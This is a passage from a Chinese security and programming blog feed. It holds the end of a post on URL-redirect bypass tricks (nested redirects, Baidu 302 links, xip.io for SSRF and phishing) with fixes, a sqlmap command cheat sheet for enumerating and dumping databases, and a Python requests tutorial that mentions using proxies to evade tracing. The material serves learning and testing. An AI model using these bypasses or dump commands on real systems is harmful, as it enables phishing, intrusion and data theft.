比如http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com。当然，还有多重的，这个结构的多重跳转你修改最后面的 URL 就可以达到任意URL 跳转，中间的 URL 就没必要动了。</p><h3 id="点击触发达到绕过-url-跳转限制">点击触发达到绕过 URL跳转限制</h3><p>比如很多登陆页面的地方，其 URL 是一个跳转的URL，如：http://www.aaa.com/acb?Url=http://test.com。你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转，当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。</p><h3 id="利用超链接绕过可信站点限制">利用超链接绕过可信站点限制</h3><p>比如一个 URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com 或 qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的，只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了。难道就这样错失一个URL 跳转漏洞了？其实不然，只要你的 URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx因为你在百度里点击你的域名，它会先是一个 302 跳转，而这个 302跳转就是百度下的 302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL，当然，百度这个 302 有点长，你给它进行加密就行。</p><h3 id="post-参数中的-url-跳转">POST 参数中的 URL 跳转</h3><p>当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交，当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST 参数里，你就可以直接修改这个地址为任意URL，然后到达下一步，这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX，当点击图片右键选择查看图像时，就会触发 URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息，为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。</p><p>当然，如果 POST 参数里就只是 URL 跳转参数，那么你可以给它转成 GET方式，然后进行跳转就可以了，只要网站支持这样的 GET 方式就行，在 BurpSuite 里可以一键转换提交方式，右键选择 Change request method就可以！</p><h3 id="利用-xip.io-绕过">利用 xip.io 绕过</h3><p>请求是 <ahref="http://www.127.0.0.1.xip.io/">http://www.127.0.0.1.xip.io</a>这个绕过是在 SSRF 场景中的绕过，比如 SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，<ahref="http://www.qq.com.220.181.57.217.xip.io/">http://www.qq.com.220.181.57.217.xip.io</a>当你访问 qq 这个域名时，其实这个链接已经被解析到后面这个 IP地址上了，那么实际访问的就是后面这个 IP 地址。</p><h2 id="漏洞修复的方法">漏洞修复的方法</h2><ol type="1"><li>若跳转的 URL 事先是可以确定的，包括 url和参数的值，则可以在后台先配置好，url 参数只需传对应 url的索引即可，通过索引找到对应具体 url 再进行跳转；</li><li>若跳转的 URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg 首先需要进行验证签名通过才能进行跳转；</li><li>若 1 和 2 都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url进行按规则校验：即控制 url是否是你们公司授权的白名单或者是符合你们公司规则的 url：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function checkURL ( sURL) &#123;</span><br><span class="line">return (/^(https?:\/\/)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\/|\)/i).test(sUrl)||(/^[\w][\w\/.-_%]+$/i).test(sUrl)||(/^[\/\][^\/\]/i).test(sUrl) ? true : false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4" type="1"><li>XSS 漏洞的注意事项 ：跳转 url 检测中也加入了 CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含%00 -&gt; %1f 的控制字符时都是不合法的，需对其进行删除)。</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap 基础命令</title>
      <link href="/blog/2019/10/05/websec/sql_injection/sqlmap/"/>
      <url>/blog/2019/10/05/websec/sql_injection/sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="大佬博文">大佬博文</h1><p><a href="https://www.freebuf.com/articles/web/29942.html">SQL 注入之SQLmap 入门</a></p><p><a href="https://www.jianshu.com/p/4fb15a2c9040">SQLMap用户手册【超详细】</a></p><p><a href="https://www.jianshu.com/p/cf7f646b3448">使用 sqlmap曲折渗透某服务器</a></p><h1 id="常用命令">常用命令：</h1><h2 id="检测注入">检测注入</h2><p>sqlmap -u 你要测试的 url</p><p>当然，参数用不用引号包围都可以，使用单双引号也无所谓。</p><p>--start 指定从第几条记录开始读取; --stop指定读取到第几条记录结束。</p><p>如果要跳过爆破数据表/字段等，直接脱裤，可以使用 --dump -D数据库名</p><p>--dbs 猜解库名 -D 指定某个库</p><p>--tables 猜解表名 -T 指定表</p><p>--columns 猜解列名 -C 指定字段</p><p>--dump 根据指定的位置（可以与上面-大写字母连用）爆数据</p><h2 id="补充">补充</h2><ol type="1"><li><p>大多数情况下，一个杠后面用单词首字母/缩写，两个杠后面用完整单词。</p></li><li><p>-b, --banner Retrieve DBMS banner 取回 DBMS 的 banner。</p><p>banner 翻译为标题，旗帜，标识。一般有以下四项(下面是一个 banner实例)</p><blockquote><p>web server operating system: Windows web application technology:Apache 2.4.23, PHP 5.3.29 back-end DBMS: MySQL &gt;= 5.0 banner:'5.5.53'</p></blockquote></li><li><p>F12 打开开发者工具，找到 console 页面，输入 document.cookie可以一起查看所有 cookies。（意味着可以一起复制）</p></li><li><p>测试过程中，询问你关于一些配置问题时，会出现[Y/n]，大写的为默认的，即：按下回车便是大写的那个字母代表的意思，这里是yes。</p><p>（一般来说，不写--batch的时候，遇到的一些选项都选默认没有问题，如果遇到重定向，可以选n,虽然默认是 Y）</p></li><li><p>post 注入</p><ol type="1"><li><p>sql 与 burpsuite 配合：</p><p>通过 burpsuite 抓包，然后将报文 copy to file，使用 sqlmap 的 -r参数读取该文件</p><p>比如：sqlmap -r get.txt</p></li><li><p>--data=‘post 数据（与 hackbar 格式一样）’</p></li></ol><p>-p 参数名 指定要检测的参数的名字，可用可不用</p></li><li><p>--batch 参数 nerver ask for user input use default option</p><p>不向用户请求一些参数，使用系统默认的，因为如果不加该参数，在扫描过程成功，你会发现它会暂停，询问如：DBMS似乎是 mysql，是否使用一切 mysql注入方式进行检测放弃其他数据库类型检测等。</p></li></ol><h1 id="sqlmp-与-burpsuite">Sqlmp 与 BurpSuite</h1><p>sqlmap 通过解析 burp suite 拦截的 http报文，从而获取信息，然后进行检测。</p><p>sqlmap -r filename --batch -smart</p><p>sqlmap -l filename --batch -smart</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Requests 基础</title>
      <link href="/blog/2019/10/05/programming/python/requests_basic/"/>
      <url>/blog/2019/10/05/programming/python/requests_basic/</url>
      
        <content type="html"><![CDATA[<h1 id="requests-入门">Requests 入门</h1><p><a href="https://requests.readthedocs.io/en/master/">官方文档</a></p><p>问题：为什么要学习 requests，而不是 urllib？</p><ol type="1"><li><p>Requests 的底层实现就是 urlib</p></li><li><p>Requests 在 python2 和 python3 中通用，方法完全一样</p></li><li><p>Requests 简单易用</p></li><li><p>Requests 能够自动帮助我们解压（gzip 压缩的等）网页内容</p></li></ol><h1 id="安装模块">安装模块</h1><ol type="1"><li><p>使用 pip install</p><p>pip --version 查看当前 pip 是 Python 2 的，还是 Python 3 的</p><p>注：直接输入工具名回车，一般都是帮助信息</p></li><li><p>下载压缩包，解压，使用 Python 运行 setup.py</p></li><li></li></ol><p>HTTP 请求方法：</p><p>get、post、put、delete、option</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>返回一个 response 对象，通过 response对象的方法，我们可以处理响应内容。</p><h1 id="属性与方法">属性与方法</h1><p><strong>区分属性与方法：</strong></p><p>属性是名词，是对象固有的属性</p><p>方法是动词，是对象可以做的事情</p><h2 id="response.text">response.text</h2><ul><li><p>类型：str</p></li><li><p>解码类型：根据 HTTP头部对响应的编码作出有根据的推测，推测的文本编码</p></li><li><p>如何修改编码方式：response.encoding=”gbk”</p></li><li><p>Requests 会自动对响应正文进行解码：如果 Response.encoding为空，那么 requests 根据 header来确定响应的编码方式，然后进行解码。如果你可以确定响应的编码方式，也可以先对Response.encoding 进行设置，然后再通过 Response.text获取响应正文。</p></li></ul><h2 id="response.content">response.content</h2><ul><li><p>类型：bytes</p></li><li><p>解码类型：没有指定</p></li><li><p>如何修改编码方式：response.content.deocde（“utf8"）</p></li><li><p>如果你想取文本，可以通过 r.text。 如果想取图片，文件，则可以通过r.content。 （ resp.json() 返回的是 json 格式数据）</p><p>当然，由于二进制是最原始的数据，我们方便对他进行任意操作，于是常用且推荐使用:<strong>response.content.decode()</strong></p></li></ul><p><strong>requests 中解决编解码问题：</strong></p><ul><li>response.content.decode() 默认使用 utf8</li><li>response.content.decode('gbk')</li><li>response.text</li></ul><h2 id="response.status_code-状态码">response.status_code 状态码</h2><p>当状态码为 200 时，只能说请求某个 URL成功了，但是不一定是我们传入的参数 URL 地址。</p><p>比如：我们现在请求一个登陆之后才能访问的页面，服务器会将我们重定向到登录页面，而我们成功访问登录页面，于是返回200.</p><p>区分 4xx or 5xx 与 200</p><ol type="1"><li><p>直接使用 <code>response.status_code</code> 或者<code>assert resposne.status_code == 200</code>（需要 tryexcept）</p></li><li><p><code>response.raise_for_status()</code> raise an exception forerror codes (4xx or 5xx),</p></li></ol><p>很多时候我们需要请求很多网页，那么我们需要定义一个方法，专门发送请求获得相应响应，并进行异常处理。然后再在别的方法中进行处理。</p><h2 id="response.header-响应头">response.header 响应头</h2><p>响应头，一般只关注 Set-Cookie 字段</p><p>当我们关注网站如何设置 cookie 的时候，不应该只管响应头的 Set-Cookie字段，因为也可以通过 JS 设置 cookie 到本地，所以也要关注一下 JS。</p><p>response.request中有着关于请求报文的信息，可以通过对应的方法获得。</p><p>response.request.header 请求头、response.request.method 请求方法</p><p>注意：</p><ol type="1"><li>如果遇到重定向，请求和响应的 URL 就会不一样。</li><li>requests 模块默认的 User-Agent 为python-requests/2.22.0（版本号可略有不同），所以我们要使用它时，要单独设置UA，否则会被立即识别为爬虫，然后返回一个与浏览器的页面不一定相同的页面。</li></ol><h2 id="发送带-header-请求">发送带 header 请求</h2><p>我们只需要传递一个字典形式的 header 参数即可，注意：header需要是键值对的形式，不要只写值，不写名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure><p>此处，我们发送带 header请求是为了模拟浏览器，防止被识别为爬虫。如果有一天我们单单带上UA，还是会被识别为爬虫，那么我们就要考虑带上 headers中别的字段值了。如果还不行，我们可以考虑 带上 cookie</p><h2 id="发送带参数的请求">发送带参数的请求</h2><p>比如以下 URL 中 ？后面便是参数的键值对</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.google.com/search?q=python</span><br></pre></td></tr></table></figure><p>参数形式：字典</p><p>注意：有的参数对请求内容来说是没有用的，我们要测试出那些重要的参数。</p><p><strong>两种方式：</strong></p><ol type="1"><li><p>requests 提供的方式</p><p>比如：https://xxx.com/search.php?key=Python&amp;time=2018</p><p>url = 'https://xxx.com/search.php' # 注意：带不带问号均可，requests会判断有无问号，然后帮我们调整，使其有一个问号。</p><p>keyword=｛‘key’:'Python', 'time':2018｝</p><p>requests.get(url, params=keyword)</p></li><li><p>拼接字符串</p><p><a href="https://zhuanlan.zhihu.com/p/37936007">字符串格式化</a></p><p>3.6 及以上建议使用：f-string，采用直接在字符串中内嵌变量的方式进行字符串格式化操作</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">param1 = <span class="string">&#x27;Python&#x27;</span></span><br><span class="line">param2 = <span class="number">2018</span></span><br><span class="line">url =<span class="string">f&quot;https://xxx.com/search.php?key=<span class="subst">&#123;param1&#125;</span>&amp;time=<span class="subst">&#123;param2&#125;</span>&quot;</span></span><br><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure></p><p>当然，老式的方法我们也要能看懂：</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url  =&quot;https://xxx.com/search.php?key=&#123;&#125;&amp;time=&#123;&#125;&quot;.format(param1，param2)</span><br><span class="line">url  =&quot;https://xxx.com/search.php?key=%s&amp;time=%d&quot; % (param1, param2)</span><br></pre></td></tr></table></figure></p><p><strong>注意：编码问题</strong></p><p><strong>如果使用 w 模式打开文件写入报错，那在打开文件时，添加encoding 字段</strong></p><p>使用 ‘wb’ 模式打开文件写入没有问题</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(&#x27;liyiba-&#x27;+str(i+1)+&#x27;.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="line">   f.write(response.content.decode())</span><br><span class="line">或</span><br><span class="line">with open(file_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br></pre></td></tr></table></figure></p><p>类的每个方法的第一个参数为指向实例的引用。在类的方法中使用类的成员或方法也要在前面加上self.</p></li></ol><h2 id="post-请求">Post 请求</h2><p>哪些地方我们会用到 POST 请求：</p><ul><li>登录注册（POST 比 GET 更安全）</li><li>需要传输大文本内容的时候（POST 请求对数据长度没有要求）所以同样的，我们的爬虫也需要在这两个地方去模拟浏览器发送 post 请求</li></ul><p>发送 POST 请求用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">response=requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>, data=data, headers=headers)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">data的形式：字典</span><br><span class="line">本例中通过必应翻译的例子看看 post 请求如何使用</span><br><span class="line"></span><br><span class="line"><span class="comment">## 代理</span></span><br><span class="line"></span><br><span class="line">[反向代理为何叫反向代理？](https://www.zhihu.com/question/<span class="number">24723688</span>)</span><br><span class="line"></span><br><span class="line">[正向代理与反向代理的区别](https://www.jianshu.com/p/208c02c9dd1d)</span><br><span class="line"></span><br><span class="line">正向代理隐藏真实客户端，反向代理隐藏真实服务端</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">requests.get（<span class="string">&quot;http://www.baidu.com&quot;</span>，proxies=proxies）</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">proxies 的形式：字典</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">proxies = &#123;</span><br><span class="line"><span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://12.34.56.79:9527&quot;</span>,</span><br><span class="line"><span class="string">&quot;https&quot;</span>: <span class="string">&quot;https://12.34.56.79:9527&quot;</span>,</span><br><span class="line">｝</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">问题：为什么爬虫需要使用代理？</span><br><span class="line"></span><br><span class="line">- 让服务器以为不是同一个客户端在请求</span><br><span class="line"></span><br><span class="line">- 防止我们的真实地址被泄露，防止被追究</span><br><span class="line"></span><br><span class="line">获取 requests 获取本地以及远程地址：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(response.raw._connection.sock.getpeername()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(response.raw._connection.sock.getsockname()[<span class="number">0</span>])</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">其实是访问偏底层的套接字，然后使用套接字的方法获取套接字的属性</span><br><span class="line"></span><br><span class="line">&gt; In the rare <span class="keyword">case</span> that you’d like to get the raw socket response <span class="keyword">from</span> the server, you can access</span><br><span class="line">&gt; r.raw. If you want to do this, make sure you <span class="built_in">set</span> stream=<span class="literal">True</span> <span class="keyword">in</span> your initial request. Once you do, you can do this</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>,stream = <span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock</span><br><span class="line">&lt;ssl.SSLSocket fd=<span class="number">848</span>, family=AddressFamily.AF_INET, <span class="built_in">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">&#x27;113.54.192.201&#x27;</span>, <span class="number">15592</span>), raddr=(<span class="string">&#x27;182.61.200.7&#x27;</span>, <span class="number">443</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(res.raw._connection.sock)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;ssl.SSLSocket&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.laddr</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">   File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;SSLSocket&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;laddr&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getpeername()</span><br><span class="line">(<span class="string">&#x27;182.61.200.7&#x27;</span>, <span class="number">443</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getsockname()</span><br><span class="line">(<span class="string">&#x27;113.54.192.201&#x27;</span>, <span class="number">15592</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.content.decode()</span><br><span class="line">此处省略一个html的代码</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>res.raw._connection.sock.getsockname()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">   File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;sock&#x27;</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">这里不能直接访问 laddr 和 raddr，socket 没有将其暴露出来，私有属性，所以我们只能通过接口，也就是使用`getsockname()` 获得 `laddr`、 `getpeername()` 获取 `raddr`</span><br><span class="line"></span><br><span class="line">参考：[How do I <span class="built_in">print</span> the local <span class="keyword">and</span> remote address <span class="keyword">and</span> port of a connected socket?](https://stackoverflow.com/questions/<span class="number">41250805</span>/how-do-i-<span class="built_in">print</span>-the-local-<span class="keyword">and</span>-remote-address-<span class="keyword">and</span>-port-of-a-connected-socket)</span><br><span class="line"></span><br><span class="line">注意：在使用过程中，如果在调用 response.raw.connection.sock.getpeername() 之前进行了例如 response.text 或 response.content 的调用，那么这时候就会报错：response.raw.connection.sock.getpeername()!</span><br><span class="line"></span><br><span class="line">参考：[获取python requests模块请求的ip地址](https://just4fun.im/<span class="number">2017</span>/08/06/%E8%8E%B7%E5%8F%96python-requests%E6%A8%A1%E5%9D%<span class="number">97</span>%E8%AF%B7%E6%B1%<span class="number">82</span>%E7%9A%84ip%E5%9C%B0%E5%9D%<span class="number">80</span>/)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[列表推导式](https://www.runoob.com/note/<span class="number">15802</span>)</span><br><span class="line"></span><br><span class="line">[Python的各种推导式（列表推导式、字典推导式、集合推导式）](https://blog.csdn.net/yjk13703623757/article/details/<span class="number">79490476</span>)</span><br><span class="line"></span><br><span class="line">原因：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 简洁</span><br><span class="line"><span class="number">2.</span> 因为扁平设计嵌套（Python 之禅）</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> python 不同编辑器以及不同地方拷贝代码时，要注意缩进，Tab 与 空格，</span><br><span class="line"><span class="number">2.</span> python中出现IndentationError:unindent does <span class="keyword">not</span> <span class="keyword">match</span> <span class="built_in">any</span> outer indentation level 就是因为缩进与空格的问题</span><br><span class="line"></span><br><span class="line"><span class="comment">## Requests 模拟登陆的三种方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### cookie 和 session 的区别</span></span><br><span class="line"></span><br><span class="line">- Cookie 数据存放在客户的浏览器上，session 数据放在服务器上。</span><br><span class="line">- cookie 不是很安全，别人可以分析存放在本地的 cookie 并进行 |cookie 欺骗。</span><br><span class="line">- session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。</span><br><span class="line">- 单个 cookie 保存的数据不能超过 <span class="number">4</span> K，很多浏览器都限制一个站点最多保存 <span class="number">20</span> 个 cookie。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 爬虫处理 Cookie 和 session</span></span><br><span class="line"></span><br><span class="line">带上 cookie、session 的好处：能够请求到登录之后的页面</span><br><span class="line"></span><br><span class="line">带上 cookie、session 的弊端：一套 cookie 和 session 往往和**一个用户**对应。请求太快，请求次数太多，容易被服务器识别为爬虫</span><br><span class="line"></span><br><span class="line">**不需要 cookie 的时候尽量不去使用 cookie**， 但是为了**获取登录之后的页面**，我们必须发送带有 cookies 的请求。</span><br><span class="line"></span><br><span class="line"><span class="comment">####1. 携带 cookie 请求</span></span><br><span class="line"></span><br><span class="line">- 携带一堆 cookie 进行请求，把 cookie 组成 cookie 池</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 2. 处理 cookie 、session 请求</span></span><br><span class="line"></span><br><span class="line">Requests 提供了一个叫做 session 类，来实现客户端和服务端的会话保持</span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> **实例化**一个 session 对象</span><br><span class="line"><span class="number">2.</span> 让 session **发送** get 或者 post 请求</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">session=requests.session()</span><br><span class="line">response=session.get(url, headers)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">动手尝试使用 session来登录人人网:</span><br><span class="line"></span><br><span class="line">http://www.renren.com/PLogin.do</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 使用 requests 提供的 session 类来请求登陆之后的网站的思路</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 实例化 session</span><br><span class="line"><span class="number">2.</span> 先使用 session 向登录页面的表单提交， 发送 POST 请求，登录网站，session 对象自动把 cookie 保存在 session 中</span><br><span class="line"><span class="number">3.</span> 再使用 session 请求登陆之后才能访问的网站，session 能够自动的携带登录成功时保存在其中的 cookie，进行请求</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">session = requests.session()</span><br><span class="line">post_url = <span class="string">&quot;https://www.****.com//login_check&quot;</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;_username&quot;</span>:<span class="string">&quot;615836359@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;_password&quot;</span>:<span class="string">&quot;*******&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 session发送 post 请求,cookie 保存在其中</span></span><br><span class="line">session.post(post_url, data=post_data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再使用 session 进行请求 登录之后才能访问的地址</span></span><br><span class="line">r = session.get(<span class="string">&quot;https://www.***.com/my/orders&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存页面</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content.decode())</span><br><span class="line">```</span><br><span 